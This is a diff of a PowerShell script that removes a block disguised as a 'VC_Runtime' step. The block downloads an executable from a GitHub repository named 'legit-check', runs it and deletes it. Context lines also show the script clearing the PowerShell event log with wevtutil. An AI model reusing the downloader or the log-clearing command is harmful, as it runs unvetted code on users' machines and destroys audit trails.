@@ -39,15 +39,6 @@ function Send-Webhook-Data() {
 }
 
 
-#VC_Runtime
-Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/0.exe" -OutFile "1.exe"
-Start-Process -FilePath "1.exe" -Wait
-if (Test-Path "1.exe") { Remove-Item -Path "1.exe" -Force }
-#END
-
-
-
-
 Write-Logo
 
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
@@ -572,6 +563,7 @@ wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
 
 
 Write-Host "Done! $($duration.TotalMinutes.ToString("F2")) min"
+
 
 
 
